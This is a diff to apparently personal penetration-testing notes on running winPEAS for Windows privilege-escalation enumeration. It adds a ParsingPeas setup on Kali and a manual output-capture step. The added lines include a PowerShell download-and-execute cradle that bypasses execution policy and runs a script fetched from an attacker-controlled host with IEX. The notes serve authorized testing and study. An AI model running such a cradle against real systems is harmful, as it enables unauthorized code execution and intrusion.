@@ -12,14 +12,35 @@ GitHub Source: https://github.com/peass-ng/PEASS-ng
 
 Use batch script on older Windows OS if needed.
 
-## winPEAS Run and Copy Output to Z:\downloads\winpeas
+## ParsingPeas workflow (preferred)
+Primary parser/workflow: https://github.com/YuvalMil/ParsingPeas
+
+On Kali:
+```bash
+git clone https://github.com/YuvalMil/ParsingPeas
+cd ParsingPeas
+./setup.sh
+pip3 install -r requirements.txt
+python3 receiver.py
 ```
-.\winPEASx64.exe log
-copy .\out.txt Z:\downloads\winpeas\winpeas.out
+
+On target:
+```powershell
+powershell -ExecutionPolicy Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://YOUR_KALI_IP:8000/wrapper-inline.ps1')"
 ```
-Use `log` for more portable output.
-Then use parsers to convert the output to a better format for viewing outside of the original shell:
-https://github.com/peass-ng/PEASS-ng/tree/master/parsers or better, https://github.com/mnemonic-re/parsePEASS
+
+This keeps the full workflow on your Kali box: serve PEAS, collect output, and generate the HTML report automatically.
+
+## winPEAS manual output capture
+```
+.\winPEASx64.exe log=winpeas.out
+copy .\winpeas.out Z:\downloads\winpeas\
+```
+Use `log=winpeas.out` for more portable output.
+If you are not using the full ParsingPeas receiver flow, parse the saved file on Kali with:
+```bash
+python3 parser.py /path/to/winpeas.out
+```
 
 Other popular automated enumeration tools:
 - PrivescCheck: https://github.com/itm4n/PrivescCheck
